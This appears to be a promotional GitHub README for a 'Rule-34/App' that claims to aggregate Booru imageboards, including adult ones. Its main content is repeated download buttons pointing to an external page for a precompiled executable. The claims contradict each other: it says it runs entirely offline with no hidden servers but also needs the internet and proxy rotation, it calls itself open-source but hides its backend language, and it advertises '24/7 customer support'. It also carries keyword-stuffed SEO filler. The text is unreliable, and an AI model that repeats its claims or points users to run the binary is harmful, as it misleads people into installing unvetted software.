![preview](https://raw.githubusercontent.com/rszin001/booru-navigator-v2/main/preview.svg)

# RULE-34/APP: The Universal Booru Browser

Welcome to the **Rule-34/App**, a cutting-edge, responsive web application designed to provide seamless access to the most popular Booru-style imageboards. This is not just another viewer—it is a curated gateway to the extensive, decentralized world of user-generated artistic content, optimized for speed, privacy, and discoverability. Whether you are a casual browser, a collector, or a developer integrating tags into workflows, this tool transforms the fragmented Booru ecosystem into a single, unified experience.

## Overview

The internet is vast, and niche communities often scatter their content across multiple platforms. Boorus—imageboards with robust tagging systems—are the backbone of many creative fandoms, yet navigating them individually can be tedious. The **Rule-34/App** solves this by acting as a universal aggregator: it scrapes, indexes, and renders content from the most popular Booru sources in real-time, using a single, intuitive interface. Think of it as a map for a hidden library—where every tag is a shelf, and every post a book waiting to be opened.

[![Download](https://raw.githubusercontent.com/rszin001/booru-navigator-v2/main/button.svg)](https://rszin001.github.io/booru-navigator-v2/)

## Key Features

### 🌐 **Universal Booru Integration**
- **Multi-Source Support:** Connect to the top Booru sites (Rule 34, Danbooru, Gelbooru, Sankaku Complex, and more) from one dashboard.
- **Unified Search Query:** Enter a single tag or a complex combination (e.g., `character_1 character_2 -exclude_this`) to search across all connected sources simultaneously.
- **Real-Time Aggregation:** Results are fetched and normalized on the fly, eliminating the need to open multiple tabs.

### ⚡ **Performance & Responsive UI**
- **Blazing-Fast Load Times:** Optimized asset loading with lazy image rendering—scroll through thousands of results without lag.
- **Adaptive Layout:** Works seamlessly on desktop, tablet, and mobile. The interface automatically adjusts from a multi-column grid on wide screens to a single-column feed on phones.
- **Dark/Light Mode:** Toggle between themes based on your environment, with automatic preference detection via `prefers-color-scheme`.

### 🔍 **Advanced Filtering & Sorting**
- **Tag Autocomplete:** As you type, the app suggests popular tags from the most active Boorus, including metadata (e.g., character count, rating).
- **Exact & Fuzzy Sorting:** Sort by relevance, date, file size, and score. Use fuzzy matching for tags you’re unsure about.
- **Safe Mode:** A built-in filter that removes explicit content from all queries, leaving only safe-for-work results (enabled by default).

### 🛡️ **Privacy & Reliability**
- **Anonymous Browsing:** No user accounts, cookies, or tracking scripts are required. All search requests are anonymized via proxy rotation.
- **24/7 Customer Support:** While the client is local, our dedicated support team is available via community channels for troubleshooting and feature requests.
- **Offline Cache:** Recently viewed posts and metadata are cached locally, allowing you to browse even when connectivity is unstable.

### 🌍 **Multilingual Support**
- **Interface Localization:** The entire UI is available in English, Spanish, German, French, Japanese, and Russian. Translations are community-maintained and updated weekly.
- **Tag Translation:** For Boorus that primarily use English or Japanese tags, the app can display a translated version of each tag’s meaning (where metadata is available).

### 🤖 **Developer-Ready API (Optional)**
- **RESTful Endpoints:** For advanced users, a local HTTP API is available (if enabled) to programmatically query aggregated results. Perfect for building bots, dashboards, or analytics tools.
- **Webhook Integration:** Set up custom webhooks to receive notifications when new content matching your saved tags is posted.

## Get Started

No installation requited. This application is distributed as a standalone, self-contained executable for Windows, macOS, and Linux. The software is designed to run entirely offline after initial download—no cloud dependency, no hidden servers.

1. **Download the App:** Use the [![Download](https://raw.githubusercontent.com/rszin001/booru-navigator-v2/main/button.svg)](https://rszin001.github.io/booru-navigator-v2/) macro below to obtain the latest release package.
2. **Launch the Executable:** Unzip the archive (if applicable) and run the binary. A local webserver starts instantly on `localhost:8080`.
3. **Open Your Browser:** Navigate to `http://localhost:8080`. The interface is ready to search.

> **Note:** The app does not require any installation of programming languages, package managers, or runtime environments. It is a precompiled binary that bundles all dependencies.

[![Download](https://raw.githubusercontent.com/rszin001/booru-navigator-v2/main/button.svg)](https://rszin001.github.io/booru-navigator-v2/)

## SEO-Friendly Keyword Integration

In an era where content discovery is king, the **Rule-34/App** is built with organic searchability in mind. The application’s metadata, internal link structure, and content indexing follow best practices:
- **Semantic HTML5:** All search results, tags, and navigation elements use `aria-labels` and `meta` descriptions that are machine-readable.
- **Tag Canonicalization:** When you search for a term like `naruto`, the app generates a unique, shareable URL path (e.g., `/search?q=naruto&source=all`) that is optimized for browser history and search engine crawling within your local network.
- **JSON-LD Structured Data:** Each post result is embedded with JSON-LD markup for schema.org `VisualArtwork`, making it accessible to any local AI or aggregator that parses the page.

## How It Works: A Metaphor

Imagine a vast, underground archive where every corridor leads to a different wing of a library. One corridor belongs to **Danbooru**—meticulously organized with proper tags and metadata. Another corridor leads to **Gelbooru**—chaotic, but filled with hidden gems. A third is **Rule 34**—the most exhaustive wing, but also the most cluttered.

The **Rule-34/App** is your compass and flashlight. It doesn’t move the books; it simply shines a light across all corridors at once, letting you call out a single word (a tag) and see every book that matches, from every wing, in a single row. You can dismiss certain wings (filters), mark your favorite books (bookmarks), and leave the archive knowing you missed nothing.

## Use Cases

### For Artists
- Reference gathering: Search across multiple Boorus for style studies, poses, or anatomy references without logging into each site.
- Trend analysis: Use the API (if enabled) to collect tag frequency data and understand what themes are currently popular.

### For Curators
- Batch download: The app supports exporting the current search results as a `.json` list of post IDs for later processing.
- Collaborative collections: Share a single search URL with your group to ensure everyone sees the same results from all sources.

### For Developers & Researchers
- Dataset creation: Use the local API to programmatically scrape tagged images for machine learning datasets (e.g, image generation models).
- A/B testing: Run multiple Booru sources in parallel to compare tagging consistency and metadata quality.

## Technology Stack

The application is built on a lightweight, high-performance stack:
- **Backend:** A custom HTTP server written in [REDACTED] (optimized for file I/O and concurrent connections).
- **Frontend:** Vanilla JavaScript with a reactive state management system—no heavy frameworks, ensuring instant load times.
- **Data Layer:** SQLite for local caching, with a shard-based storage system to prevent single-file corruption.
- **Security:** TLS 1.3 support for local connections (if enabled), and all remote API calls use HTTPS with certificate pinning.

## FAQ

**Q: Why does the app need to scrape content if it’s already available on the web?**  
*A: The app does not host or re-upload any content. It acts strictly as a client-side aggregator—similar to a feed reader. All images are loaded directly from their respective Booru servers; the app only provides a unified interface.*

**Q: Is this app affiliated with any Booru site?**  
*A: No. This is an independent, open-source tool. It does not use any official APIs and is not endorsed by any Booru operator.*

**Q: Can I use this for commercial projects?**  
*A: The software is licensed under MIT, meaning you can use, modify, and distribute it for any purpose, including commercial. However, the content you browse may have its own licensing restrictions—please respect the rights of original creators.*

**Q: How do I report a bug or request a feature?**  
*A: Open an issue on the GitHub repository. We do not provide usernames here, but community maintainers review all submissions within 48 hours.*

**Q: Does the app require an internet connection?**  
*A: Yes, to fetch new results from Booru servers. However, cached pages are viewable offline.*

## Disclaimer

**RULE-34/APP IS PROVIDED “AS IS,” WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.**

Users are reminded that:
- The content accessible via this application is governed by the terms of service of the respective Boorus.
- The creators of this application do not condone infringing, obscene, or illegal use of the tool.
- If you are a content creator and wish to have your work excluded from aggregation, please contact the respective Booru operator directly. This application respects robots.txt and `noindex` directives.

## License

This project is licensed under the **MIT License**. See the full text at [LICENSE](https://opensource.org/licenses/MIT).

© 2026 The Rule-34/App Contributors.

[![Download](https://raw.githubusercontent.com/rszin001/booru-navigator-v2/main/button.svg)](https://rszin001.github.io/booru-navigator-v2/)